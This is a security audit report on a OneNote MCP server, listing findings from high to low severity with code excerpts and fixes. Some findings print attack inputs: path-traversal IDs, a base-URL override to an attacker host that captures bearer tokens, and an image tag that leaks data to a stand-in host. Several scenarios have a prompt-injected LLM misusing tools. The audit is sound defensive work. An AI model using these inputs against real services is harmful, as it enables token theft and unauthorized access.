# Security Audit Report -- OneNote MCP Server

**Date:** 2026-02-16
**Auditor:** Security Engineering Review
**Scope:** Full source code review of the OneNote MCP server
**Commit:** `124d691` (main branch)
**Verdict:** No critical vulnerabilities found. Several medium and low-severity hardening opportunities identified.

---

## Executive Summary

The OneNote MCP server is an MCP (Model Context Protocol) server that enables LLMs to interact with Microsoft OneNote through the Graph API. It handles OAuth 2.0 token management, makes authenticated API calls, processes HTML content, and exposes tools/resources/prompts over JSON-RPC via STDIO.

The codebase demonstrates strong security awareness in several areas: the OAuth state parameter uses `crypto.randomBytes`, the token store file is written with `0o600` permissions, HTML escaping is applied where user data enters HTML contexts, error messages avoid leaking raw tokens, and pagination has a safety limit. However, there are areas that warrant attention, primarily around input validation of IDs used in URL path construction, potential SSRF via environment variable overrides, and some defense-in-depth improvements.

---

## Findings

### CRITICAL

**No critical findings.**

The codebase does not contain any immediately exploitable vulnerabilities that could lead to remote code execution, authentication bypass, or unauthorized data access in a standard deployment scenario.

---

### HIGH

#### H-1: Unsanitized IDs Interpolated into Graph API URL Paths

**Severity:** HIGH
**Affected Files:**
- `src/tools/get-notebook.ts` (line 37)
- `src/tools/get-section.ts` (line 35)
- `src/tools/get-section-group.ts` (line 37)
- `src/tools/get-page.ts` (line 35)
- `src/tools/get-page-content.ts` (line 41)
- `src/tools/get-page-preview.ts` (line 34)
- `src/tools/update-page.ts` (line 62)
- `src/tools/delete-page.ts` (line 35)
- `src/tools/create-page.ts` (line 44)
- `src/tools/create-section.ts` (lines 64-66)
- `src/tools/list-sections.ts` (lines 51, 53)
- `src/tools/list-section-groups.ts` (line 44)
- `src/tools/list-pages.ts` (line 44)
- `src/tools/search-pages.ts` (lines 55-56)
- `src/resources/notebooks.ts` (line 97)
- `src/resources/sections.ts` (line 40)
- `src/resources/pages.ts` (lines 41, 80)

**Description:**
All tool and resource handlers interpolate user-supplied IDs (notebookId, sectionId, sectionGroupId, pageId) directly into Graph API URL paths without validation or encoding. For example:

```typescript
// get-notebook.ts, line 37
path: `/me/onenote/notebooks/${notebookId}`,

// delete-page.ts, line 35
path: `/me/onenote/pages/${pageId}`,
```

The Zod schema for these IDs is simply `z.string()` with no format constraints. While the `new URL()` constructor in `OneNoteClient.request()` will normalize the URL, it does not prevent path traversal or path manipulation. A malicious or confused LLM could supply:

- `../../../users/other-user-id/onenote/notebooks` as a notebookId to attempt accessing another user's resources
- `foo?$filter=...&` to inject additional OData query parameters
- Values containing `/`, `?`, `#`, or `..` to alter the request path

**Attack Scenario:**
A prompt-injected or adversarial LLM supplies a crafted `pageId` value like `../../users/{victimId}/onenote/pages/{targetPageId}` to the `delete-page` tool. The resulting URL path would be `/me/onenote/pages/../../users/{victimId}/onenote/pages/{targetPageId}`, which after URL normalization becomes `/users/{victimId}/onenote/pages/{targetPageId}`. The `Bearer` token from the current user would be sent to this endpoint.

**Risk Assessment:**
The practical exploitability is limited by two factors: (1) the Graph API likely returns 403/404 for cross-tenant access, and (2) the `new URL()` constructor normalizes paths. However, this represents a defense-in-depth failure. The server should not trust LLM-supplied parameters to be well-formed identifiers. In a confused-deputy scenario where the authenticated user has delegated permissions to multiple resources, path manipulation could lead to unintended operations.

**Recommended Fix:**
Add a validation helper that rejects IDs containing path-dangerous characters. Apply it to all ID parameters:

```typescript
// In a shared validation module
const SAFE_ID_PATTERN = /^[a-zA-Z0-9!_\-=.]+$/;

export function validateId(id: string, name: string): void {
  if (!SAFE_ID_PATTERN.test(id) || id.includes('..')) {
    throw new Error(`Invalid ${name}: contains disallowed characters`);
  }
}
```

Alternatively, apply `encodeURIComponent()` to every ID before path interpolation:

```typescript
path: `/me/onenote/notebooks/${encodeURIComponent(notebookId)}`,
```

---

#### H-2: SSRF via Configurable Base URLs

**Severity:** HIGH
**Affected Files:**
- `src/onenote/auth.ts` (lines 53-54)
- `src/onenote/oauth.ts` (lines 249-251)
- `src/onenote/client.ts` (lines 37-39)
- `src/onenote/types.ts` (line 53)
- `.env.example` (lines 47, 50)

**Description:**
The server allows overriding both the Graph API base URL (`ONENOTE_GRAPH_BASE_URL`) and the OAuth authority base URL (`ONENOTE_OAUTH_AUTHORITY_BASE_URL`) via environment variables. The `OneNoteClientConfig` also accepts an arbitrary `baseUrl`. There is no validation that these URLs point to legitimate Microsoft endpoints.

In `auth.ts`, the `verifyToken` function uses the override:

```typescript
const baseUrl = process.env["ONENOTE_GRAPH_BASE_URL"] ?? MICROSOFT_GRAPH_BASE_URL;
const response = await fetch(`${baseUrl.replace(/\/+$/, "")}/me`, {
  headers: { Authorization: `Bearer ${token}` },
});
```

If `ONENOTE_GRAPH_BASE_URL` is set to an attacker-controlled URL, the server will send the Bearer access token to that URL.

**Attack Scenario:**
If an attacker can influence the environment of the MCP server process (e.g., through a compromised MCP client configuration, a supply chain attack on the config file, or a `.env` file on a shared system), they can set `ONENOTE_GRAPH_BASE_URL=https://evil.example.com` and capture the user's Microsoft Graph access token.

**Risk Assessment:**
The environment variable override is an intentional design choice for testing/development (as documented in `.env.example`). However, it has no URL validation or allowlist. In production deployments, this could be exploited if an attacker gains write access to the `.env` file or the process environment.

**Recommended Fix:**
Validate that overridden base URLs match an allowlist of Microsoft domains:

```typescript
const ALLOWED_GRAPH_HOSTS = ['graph.microsoft.com', 'graph.microsoft.us', 'microsoftgraph.chinacloudapi.cn'];

function validateBaseUrl(url: string, allowedHosts: string[]): string {
  const parsed = new URL(url);
  if (!allowedHosts.includes(parsed.hostname)) {
    throw new Error(`Untrusted base URL host: ${parsed.hostname}`);
  }
  return url;
}
```

Alternatively, restrict the override to development mode only or require an explicit opt-in flag.

---

### MEDIUM

#### M-1: OAuth Token Error Response May Leak Sensitive Data

**Severity:** MEDIUM
**Affected File:** `src/onenote/oauth.ts` (lines 168-172)

**Description:**
When a token request fails, the full error response body (up to 500 characters) is included in the error message:

```typescript
if (!response.ok) {
  throw new OneNoteOAuthError(
    `Token request failed (${response.status}): ${text.slice(0, 500)}`,
    code
  );
}
```

Microsoft identity platform error responses can include correlation IDs, tenant IDs, timestamp details, and other internal metadata. This error message propagates through the auth chain and could end up in `console.error` output (line 117-119 of `auth.ts`).

**Attack Scenario:**
An attacker with access to the MCP server's stderr output (e.g., log aggregation system, shared terminal) could observe detailed Microsoft identity error responses that reveal tenant configuration information.

**Recommended Fix:**
Parse the error response JSON and extract only the `error` and `error_description` fields. Avoid logging the raw response body:

```typescript
let errorMessage = `Token request failed (${response.status})`;
try {
  const errBody = JSON.parse(text);
  if (errBody.error_description) {
    errorMessage += `: ${errBody.error_description.slice(0, 200)}`;
  }
} catch { /* use generic message */ }
```

---

#### M-2: Token Store Directory Permissions Not Set on Creation

**Severity:** MEDIUM
**Affected File:** `src/onenote/token-store.ts` (lines 85-87)

**Description:**
The token store file is correctly written with `mode: 0o600` (owner read/write only). However, the parent directory is created with the default `mkdirSync` permissions (typically `0o777 & ~umask`, commonly `0o755`):

```typescript
if (!existsSync(dir)) {
  mkdirSync(dir, { recursive: true });
}
```

On shared systems, other users could list the directory and see that a `tokens.json` file exists, even though they cannot read its contents. More importantly, on Windows, the `mode: 0o600` parameter to `writeFileSync` is largely ignored -- Windows uses ACLs, not Unix file permissions.

**Attack Scenario:**
On a shared Windows machine, another user on the same system could potentially read the token store file because Node.js `mode: 0o600` has no effect on Windows file permissions.

**Recommended Fix:**
1. Set directory permissions explicitly: `mkdirSync(dir, { recursive: true, mode: 0o700 })`
2. On Windows, use platform-specific ACL management (e.g., via `icacls` or the `windows-permissions` package) or document the risk
3. Consider using the OS credential store (Windows Credential Manager, macOS Keychain, Linux Secret Service) for token storage instead of plaintext files

---

#### M-3: Raw HTML Content Passed Through Without Sanitization in `create-page`

**Severity:** MEDIUM
**Affected Files:**
- `src/tools/create-page.ts` (lines 38-47)
- `src/utils/html.ts` (lines 22-26)

**Description:**
The `create-page` tool accepts an HTML `content` parameter that is inserted directly into the page body without sanitization:

```typescript
// html.ts
export function buildPageHtml(title: string, bodyContent?: string): string {
  const escapedTitle = escapeHtml(title);
  const body = bodyContent ?? "";
  return `...  <body>\n    ${body}\n  </body>\n</html>`;
}
```

The `title` is correctly HTML-escaped, but `bodyContent` is inserted raw. While this is intentional (the content is meant to be HTML), it means an LLM or user can inject arbitrary HTML including:
- `<script>` tags (though OneNote API likely strips these)
- `<img src="https://attacker.example.com/pixel.gif">` for tracking/exfiltration
- `<iframe>`, `<object>`, `<embed>` elements
- External CSS `@import` for data exfiltration

**Attack Scenario:**
A prompt-injected LLM creates a page with content `<img src="https://evil.example.com/track?user=target">`. When the user opens this page in OneNote, the image URL is fetched, revealing the user's IP address and confirming they have a OneNote account. More sophisticated attacks could use CSS-based data exfiltration techniques.

**Risk Assessment:**
The Microsoft Graph API performs its own sanitization of page content before storing it -- it strips `<script>` tags and many dangerous elements. The MCP server is acting as a pass-through, so the actual risk depends on what the Graph API allows. However, as a defense-in-depth measure, the MCP server should not blindly forward arbitrary HTML.

**Recommended Fix:**
Document that the `content` parameter expects HTML and that the Graph API performs server-side sanitization. Consider adding a basic sanitization layer that strips obviously dangerous elements before sending to the Graph API:

```typescript
function sanitizePageContent(html: string): string {
  return html
    .replace(/<script\b[^>]*>[\s\S]*?<\/script>/gi, '')
    .replace(/<iframe\b[^>]*>[\s\S]*?<\/iframe>/gi, '')
    .replace(/<object\b[^>]*>[\s\S]*?<\/object>/gi, '')
    .replace(/<embed\b[^>]*>[^<]*(?:<\/embed>)?/gi, '');
}
```

---

#### M-4: Pagination `nextLink` URL Not Validated

**Severity:** MEDIUM
**Affected File:** `src/onenote/pagination.ts` (lines 56-65)

**Description:**
The `fetchAllPages` function follows `@odata.nextLink` URLs from the Graph API response without validating that they point to a legitimate Microsoft endpoint:

```typescript
const nextLink = result.data["@odata.nextLink"];
if (!nextLink) break;

const nextUrl = new URL(nextLink);
currentPath = nextUrl.pathname.replace(/^\/v1\.0/, "");
currentParams = Object.fromEntries(nextUrl.searchParams.entries());
```

The `nextLink` value is extracted from the API response, parsed, and its path/params are used for the next request. The host is discarded (the client always uses its configured `baseUrl`), which is good. However, the path is used without validation, which means a compromised or malicious Graph API response could redirect the pagination to an arbitrary path.

**Risk Assessment:**
Low practical exploitability because (1) the `baseUrl` is not overridden by the `nextLink`, and (2) the Graph API is a trusted source. However, if `ONENOTE_GRAPH_BASE_URL` is overridden (see H-2), a malicious server could craft `nextLink` values that cause the client to iterate over unintended endpoints.

**Recommended Fix:**
Validate that the `nextLink` URL has the expected hostname before following it:

```typescript
const nextUrl = new URL(nextLink);
const baseUrl = new URL(client.getBaseUrl());
if (nextUrl.hostname !== baseUrl.hostname) {
  break; // Do not follow cross-origin pagination links
}
```

---

#### M-5: OAuth Callback Server Binds to Configured Host Without Restriction

**Severity:** MEDIUM
**Affected File:** `src/onenote/auth.ts` (lines 134-143, 317)

**Description:**
The interactive OAuth callback server binds to whatever host is configured in the redirect URI:

```typescript
const redirectUrl = new URL(config.redirectUri);
const host = redirectUrl.hostname || "localhost";
// ...
server.listen(port, host);
```

The default redirect URI is `http://localhost:3000/callback`, which binds only to the loopback interface. However, if the user configures `ONENOTE_OAUTH_REDIRECT_URI=http://0.0.0.0:3000/callback`, the callback server would bind to all network interfaces, exposing the OAuth callback endpoint to the network.

**Attack Scenario:**
On a network with other users, if the callback server is bound to `0.0.0.0`, an attacker on the same network could race to submit a crafted callback request to the server before the legitimate browser redirect arrives.

**Recommended Fix:**
Validate that the redirect URI host resolves to a loopback address, or emit a warning when binding to a non-loopback address:

```typescript
if (host !== 'localhost' && host !== '127.0.0.1' && host !== '::1') {
  console.error('[onenote-mcp] WARNING: OAuth callback server binding to non-loopback address');
}
```

---

### LOW

#### L-1: `verifyToken` Returns `true` on Network Error

**Severity:** LOW
**Affected File:** `src/onenote/auth.ts` (lines 78-80)

**Description:**
The `verifyToken` function catches all errors and returns `true`:

```typescript
} catch {
  return true;
}
```

This means that if the network is unreachable, the server will use a cached token that might be invalid or revoked. This is likely an intentional design decision (fail-open for offline scenarios), but it means a revoked token could be used if the verification endpoint is temporarily unreachable.

**Recommended Fix:**
Document this behavior. Consider adding a log message when verification fails due to a network error so operators are aware.

---

#### L-2: No Rate Limiting on OAuth Callback Server

**Severity:** LOW
**Affected File:** `src/onenote/auth.ts` (lines 234-315)

**Description:**
The HTTP callback server created for interactive OAuth has no rate limiting or request size limits. An attacker who knows the callback port could send a flood of requests to the server during the brief window it is active.

**Risk Assessment:**
The server is only active for a short period (up to the 5-minute timeout) and on localhost by default. The practical impact is minimal.

**Recommended Fix:**
The timeout already limits the window of exposure. No immediate action required, but consider closing the server after receiving the first valid callback (which is already done in the `finally` block).

---

#### L-3: `escapeHtml` Does Not Escape Single Quotes

**Severity:** LOW
**Affected File:** `src/utils/html.ts` (lines 10-16)

**Description:**
The `escapeHtml` function escapes `&`, `<`, `>`, and `"` but not single quotes (`'`):

```typescript
export function escapeHtml(str: string): string {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}
```

If escaped output is placed inside a single-quoted HTML attribute (e.g., `<div title='${escapeHtml(value)}'>`), an attacker could break out of the attribute with a single quote.

**Risk Assessment:**
In the current codebase, `escapeHtml` is used in `htmlPage()` for the `<title>` tag (which uses no attribute quoting context) and in the OAuth callback error display (which uses `<p>` element content). Neither usage is vulnerable. However, this is a latent bug that could become exploitable if `escapeHtml` is used in new contexts.

**Recommended Fix:**
Add single quote escaping:

```typescript
.replace(/'/g, "&#39;")
```

---

#### L-4: Token Store Path Injection via Environment Variable

**Severity:** LOW
**Affected File:** `src/onenote/token-store.ts` (lines 41-45)

**Description:**
The `ONENOTE_TOKEN_STORE_PATH` environment variable is used as-is for the token file path:

```typescript
export function getTokenStorePath(): string {
  const envPath = process.env["ONENOTE_TOKEN_STORE_PATH"];
  if (envPath) {
    return envPath;
  }
  return join(getDefaultStoreDir(), "tokens.json");
}
```

There is no validation that the path is within an expected directory. If an attacker can set this environment variable, they could redirect token storage to a world-readable location or a network share.

**Risk Assessment:**
Requires environment variable manipulation, which implies the attacker already has significant access. The file is still written with `0o600` permissions (on Unix).

**Recommended Fix:**
Consider validating the path does not point to a symlink or a shared location, and warn if the path is outside the user's home directory.

---

#### L-5: Search Query Not URL-Encoded Separately

**Severity:** LOW
**Affected File:** `src/tools/search-pages.ts` (lines 59-61)

**Description:**
The search query is passed as a query parameter value:

```typescript
const params: Record<string, string> = {
  $select: PAGE_SELECT_FIELDS,
  search: query,
};
```

The `OneNoteClient.request()` method uses `url.searchParams.set(key, value)` which properly URL-encodes values. This is secure. However, the OneNote `search` query parameter (not OData `$search`) may have its own syntax rules that could lead to unexpected behavior with certain special characters.

**Risk Assessment:**
The URL encoding is correct at the HTTP level. Any injection would be in the OneNote search syntax, which has limited attack surface.

**Recommended Fix:**
No immediate fix needed. The URL encoding is handled correctly by `URLSearchParams`.

---

#### L-6: No Request Body Size Limit

**Severity:** LOW
**Affected Files:**
- `src/tools/create-page.ts`
- `src/tools/update-page.ts`

**Description:**
The `create-page` and `update-page` tools accept arbitrarily large content/patches from the LLM without size limits. A malicious or runaway LLM could submit extremely large HTML content or a massive array of patch operations.

**Risk Assessment:**
The Graph API has its own size limits and will reject oversized requests. The 30-second timeout provides some protection. However, the server itself could experience memory pressure if a very large request body is constructed.

**Recommended Fix:**
Consider adding a content length limit in the Zod schema:

```typescript
content: z.string().max(1_000_000).optional()
```

---

### INFORMATIONAL

#### I-1: OAuth State Parameter Uses Strong Randomness -- GOOD

**File:** `src/onenote/oauth.ts` (line 67)

The state parameter is generated using `crypto.randomBytes(16)`, producing 128 bits of cryptographic randomness. This is appropriate for CSRF protection and meets security best practices.

---

#### I-2: Token Store File Permissions Set Correctly -- GOOD

**File:** `src/onenote/token-store.ts` (line 92)

The token file is written with `mode: 0o600`, restricting access to the owner only. This follows the principle of least privilege for sensitive credential storage on Unix systems.

---

#### I-3: Access Tokens Not Logged -- GOOD

The codebase correctly avoids logging access token values. Log messages reference token operations (e.g., "Verifying cached token...", "Token exchange successful.") without including the actual token strings. Error messages also avoid token value exposure.

---

#### I-4: OAuth Redirect URI Validated by Microsoft -- GOOD

The redirect URI is validated server-side by Microsoft's identity platform. The server correctly passes the configured redirect URI through to the authorization and token endpoints, relying on Microsoft's redirect URI validation to prevent authorization code interception.

---

#### I-5: Zod Validation Applied at Tool Registration -- GOOD

All tool parameters are validated via Zod schemas before reaching the callback handlers. The MCP SDK's `registerTool` method enforces the `inputSchema`, so parameters arrive pre-validated. This prevents type confusion attacks.

---

#### I-6: Pagination Safety Limit in Place -- GOOD

**File:** `src/onenote/pagination.ts` and `src/constants.ts`

The `fetchAllPages` function enforces a maximum of 50 pagination iterations (`ONENOTE_MAX_PAGINATION_PAGES`), preventing infinite loops from malformed `@odata.nextLink` chains.

---

#### I-7: STDIO Transport Limits Attack Surface -- GOOD

**File:** `src/index.ts`

The server communicates exclusively over STDIO (stdin/stdout), not over a network socket. This significantly limits the attack surface because only the parent process can communicate with the server. Network-level attacks are not applicable.

---

#### I-8: Console Output Goes to stderr -- GOOD

**File:** `src/index.ts` (line 9 comment)

All logging is correctly directed to `stderr`, keeping the `stdout` channel clean for JSON-RPC protocol messages. This prevents log output from corrupting the MCP protocol stream.

---

#### I-9: Timeout Handling is Consistent -- GOOD

All HTTP requests (`fetch` calls) use `AbortController` with a 30-second timeout (`FETCH_TIMEOUT_MS`). The OAuth callback server has a 5-minute timeout. This prevents indefinite hangs.

---

#### I-10: Dependencies Are Current

**File:** `package.json`

The dependency list is minimal:
- `@modelcontextprotocol/sdk@1.26.0` -- MCP SDK
- `dotenv@^17.2.3` -- Environment variable loading
- `zod@4.3.6` -- Schema validation

No known critical vulnerabilities exist in these versions at the time of this audit. The small dependency footprint reduces supply chain risk.

---

#### I-11: `.env` and `.env.local` Are Gitignored -- GOOD

**File:** `.gitignore`

The `.env`, `.env.local`, and `.env.*.local` patterns are all gitignored, preventing accidental commit of secrets.

---

## Summary Table

| ID  | Severity      | Finding                                                | Exploitable? |
|-----|---------------|--------------------------------------------------------|--------------|
| H-1 | HIGH          | Unsanitized IDs in Graph API URL paths                 | Limited      |
| H-2 | HIGH          | SSRF via configurable base URLs                        | Conditional  |
| M-1 | MEDIUM        | OAuth error responses may leak metadata                | Informational|
| M-2 | MEDIUM        | Token store directory permissions (especially Windows) | Conditional  |
| M-3 | MEDIUM        | Unsanitized HTML in create-page body content            | Conditional  |
| M-4 | MEDIUM        | Pagination nextLink URL path not validated             | Limited      |
| M-5 | MEDIUM        | OAuth callback server host binding not restricted      | Conditional  |
| L-1 | LOW           | verifyToken returns true on network error              | Design choice|
| L-2 | LOW           | No rate limiting on OAuth callback server              | Minimal      |
| L-3 | LOW           | escapeHtml missing single quote escaping               | Latent       |
| L-4 | LOW           | Token store path injectable via env var                | Conditional  |
| L-5 | LOW           | Search query syntax injection                          | Minimal      |
| L-6 | LOW           | No request body size limit on create/update            | Minimal      |

## Recommendations Priority

1. **Immediate (H-1):** Add ID validation or `encodeURIComponent` to all resource IDs before URL interpolation. This is the highest-impact change with the least effort.
2. **Short-term (H-2):** Add URL allowlist validation for base URL overrides, or restrict them to development mode.
3. **Short-term (M-2):** Address Windows token storage security; consider OS-native credential stores.
4. **Ongoing (M-1, M-3, M-4, M-5):** Implement the remaining medium-severity recommendations as part of normal development.
5. **Backlog (L-*):** Address low-severity items as time permits.
